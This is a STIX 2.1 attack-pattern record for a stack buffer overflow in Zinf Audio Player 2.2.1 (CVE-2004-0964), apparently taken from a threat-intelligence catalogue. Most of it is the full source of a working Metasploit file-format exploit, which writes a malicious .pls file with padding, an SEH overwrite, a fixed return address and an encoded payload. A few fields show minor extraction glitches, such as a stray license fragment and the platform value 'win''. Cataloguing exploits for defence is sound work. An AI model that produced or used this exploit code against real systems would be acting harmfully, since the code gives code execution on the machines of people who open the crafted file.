{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9d7cf0b7-60d2-4218-9a41-01a15cc8aa38",
    "created": "2024-08-14T16:35:30.006601Z",
    "modified": "2024-08-14T16:35:30.006605Z",
    "name": "Zinf Audio Player 2.2.1 (PLS File) Stack Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in the Zinf Audio Player 2.2.1. An attacker must send the file to victim and the victim must open the file. Alternatively it may be possible to execute code remotely via an embedded PLS file within a browser, when the PLS extension is registered to Zinf. This functionality has not been tested in this module.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/zinfaudioplayer221_pls.rb",
            "external_id": "zinfaudioplayer221_pls.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-0964"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Zinf Audio Player 2.2.1 (PLS File) Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in the Zinf Audio Player 2.2.1.\n        An attacker must send the file to victim and the victim must open the file.\n        Alternatively it may be possible to execute code remotely via an embedded\n        PLS file within a browser, when the PLS extension is registered to Zinf.\n        This functionality has not been tested in this module.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'Trancek <trancek[at]yashira.org>', 'aushack' ],\n      'References'     =>\n        [\n          [ 'CVE', '2004-0964' ],\n          [ 'OSVDB', '10416' ],\n          [ 'EDB', '7888' ],\n          [ 'BID', '11248' ],\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 800,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x3c\\x22\\x3e\\x3d\",\n          'EncoderType'   => Msf::Encoder::Type::AlphanumMixed,\n          'StackAdjustment' => -3500,\n        },\n      'DefaultOptions' =>\n        {\n          'AllowWin32SEH' => true\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          # Tested by patrick - 20090429 xpsp3\n          [ 'Zinf Universal 2.2.1', { 'Ret' => 0x1204f514 } ], #pop esi; pop ebx; ret - ./Plugins/zinf.ui\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2004-09-24',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'exploit_zinf.pls']),\n      ])\n\n  end\n\n  def exploit\n    seh = generate_seh_payload(target.ret)\n    filepls = rand_text_alpha_upper(1424) + seh\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(filepls)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-09-24",
    "x_mitre_platforms": [
        "win'"
    ]
}